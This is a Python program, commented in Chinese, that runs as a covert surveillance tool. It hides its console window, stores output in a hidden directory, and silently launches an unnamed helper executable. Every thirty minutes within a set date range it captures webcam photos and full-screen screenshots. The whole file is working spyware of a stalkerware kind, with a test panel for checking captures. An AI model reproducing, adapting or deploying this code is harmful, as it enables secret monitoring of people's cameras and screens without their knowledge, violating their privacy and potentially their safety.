import os
import sys
import time
import ctypes
import datetime
import logging
import threading
import subprocess
from pathlib import Path

import cv2
from PIL import ImageGrab

# -------------------- 配置参数 --------------------
BASE_DIR = Path("D:/HiddenCaptures")
CAM_SUBDIR = "Camera"
SCR_SUBDIR = "Screenshot"
LOG_FILE = "capture.log"

INTERVAL_SECONDS = 30 * 60
RETRY_DELAY = 5 * 60
MAX_RETRIES = 3
CAM_WARMUP_FRAMES = 30
CAMERA_INDEX = 0

VALID_START = datetime.date(2026, 5, 25)
VALID_END = datetime.date(2026, 5, 27)

# -------------------- 工具函数 --------------------
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def ensure_dir(path: Path, hidden: bool = False):
    path.mkdir(parents=True, exist_ok=True)
    if hidden and os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02)
        except Exception:
            pass

def get_timestamp():
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")

def setup_logging(log_path: Path):
    log_path.parent.mkdir(parents=True, exist_ok=True)
    # 文件日志处理器
    file_handler = logging.FileHandler(str(log_path), encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter(
        "%(asctime)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))

    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(file_handler)

    # ★ 修复点：只在控制台可用时才添加 StreamHandler
    if sys.stdout is not None:
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        console.setFormatter(logging.Formatter(
            "%(asctime)s - %(levelname)s - %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        ))
        root_logger.addHandler(console)

def start_helper():
    if getattr(sys, 'frozen', False):
        app_dir = os.path.dirname(sys.executable)
    else:
        app_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

    helper_path = os.path.join(app_dir, "swhelper1.exe")
    if os.path.exists(helper_path):
        try:
            subprocess.Popen(
                [helper_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                shell=False
            )
            logging.info(f"成功启动辅助程序: {helper_path}")
        except Exception as e:
            logging.error(f"启动辅助程序失败: {helper_path}, 错误: {e}")
    else:
        logging.warning(f"辅助程序未找到: {helper_path}")

# -------------------- 核心捕获逻辑 --------------------
def capture_camera(save_path: Path) -> bool:
    cap = None
    try:
        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
        if not cap.isOpened():
            logging.error("无法打开摄像头")
            return False

        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))

        for _ in range(CAM_WARMUP_FRAMES):
            ret, _ = cap.read()
            if not ret:
                logging.warning("预热帧读取失败")
                break
            time.sleep(0.05)

        ret, frame = cap.read()
        if not ret or frame is None:
            logging.error("拍摄照片失败")
            return False

        save_path.parent.mkdir(parents=True, exist_ok=True)
        cv2.imwrite(str(save_path), frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
        logging.info(f"摄像头照片已保存: {save_path}")
        return True
    except Exception as e:
        logging.error(f"摄像头异常: {e}")
        return False
    finally:
        if cap is not None:
            cap.release()

def capture_screen(save_path: Path) -> bool:
    try:
        img = ImageGrab.grab(all_screens=True)
        if img is None:
            logging.warning("截屏返回空图像（可能锁屏或远程桌面）")
            return False

        save_path.parent.mkdir(parents=True, exist_ok=True)
        img.save(str(save_path), "PNG")
        logging.info(f"屏幕截图已保存: {save_path}")
        return True
    except OSError as e:
        logging.warning(f"截屏失败（可能锁屏或会话不可用）: {e}")
        return False
    except Exception as e:
        logging.error(f"截屏异常: {e}")
        return False

def execute_task_with_retry():
    timestamp = get_timestamp()
    cam_dir = BASE_DIR / CAM_SUBDIR
    scr_dir = BASE_DIR / SCR_SUBDIR

    success_cam = False
    for attempt in range(1, MAX_RETRIES + 1):
        cam_path = cam_dir / f"{timestamp}_cam.png"
        if capture_camera(cam_path):
            success_cam = True
            break
        else:
            logging.warning(f"摄像头拍摄失败，第{attempt}次尝试")
            if attempt < MAX_RETRIES:
                logging.info(f"等待 {RETRY_DELAY} 秒后重试...")
                time.sleep(RETRY_DELAY)
                timestamp = get_timestamp()
    if not success_cam:
        logging.error("摄像头拍摄最终失败，放弃本次摄像头任务")

    scr_path = scr_dir / f"{timestamp}_scr.png"
    capture_screen(scr_path)

# -------------------- 正常模式 --------------------
def normal_mode():
    today = datetime.date.today()
    if not (VALID_START <= today <= VALID_END):
        logging.info(f"当前日期 {today} 不在允许范围内 ({VALID_START} ~ {VALID_END})，程序退出。")
        sys.exit(0)

    logging.info("进入正常监控模式，每30分钟执行一次拍摄...")
    while True:
        try:
            execute_task_with_retry()
        except Exception as e:
            logging.error(f"任务执行出现未捕获异常: {e}")
        time.sleep(INTERVAL_SECONDS)

# -------------------- 测试模式 --------------------
def test_mode():
    import tkinter as tk
    from tkinter import messagebox

    ensure_dir(BASE_DIR, hidden=True)
    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)

    def run_task():
        btn.config(state=tk.DISABLED)
        status_var.set("正在拍摄，请稍候...")
        def worker():
            try:
                execute_task_with_retry()
                root.after(0, lambda: status_var.set("任务完成！可查看保存的图片。"))
            except Exception as e:
                root.after(0, lambda: messagebox.showerror("错误", f"发生异常:\n{e}"))
            finally:
                root.after(0, lambda: btn.config(state=tk.NORMAL))
        threading.Thread(target=worker, daemon=True).start()

    root = tk.Tk()
    root.title("测试模式 - 屏幕与摄像头捕获")
    root.geometry("320x180")
    root.resizable(False, False)

    tk.Label(root, text="测试控制面板", font=("微软雅黑", 12)).pack(pady=10)
    status_var = tk.StringVar(value="点击按钮立即执行一次拍摄")
    tk.Label(root, textvariable=status_var, wraplength=280).pack(pady=5)
    btn = tk.Button(root, text="立即拍摄", command=run_task, width=15, height=2)
    btn.pack(pady=10)

    logging.info("测试窗口已启动")
    root.mainloop()

# -------------------- 主入口 --------------------
if __name__ == "__main__":
    hide_console()

    # 准备存储与日志
    ensure_dir(BASE_DIR, hidden=True)
    ensure_dir(BASE_DIR / CAM_SUBDIR)
    ensure_dir(BASE_DIR / SCR_SUBDIR)
    setup_logging(BASE_DIR / LOG_FILE)

    # 启动辅助程序
    start_helper()

    # 判断运行模式（无论收到什么参数，除了test外均进入正常模式，不会有任何报错）
    if "test" in sys.argv:
        logging.info("以测试模式启动")
        test_mode()
    else:
        logging.info("以正常模式启动")
        normal_mode()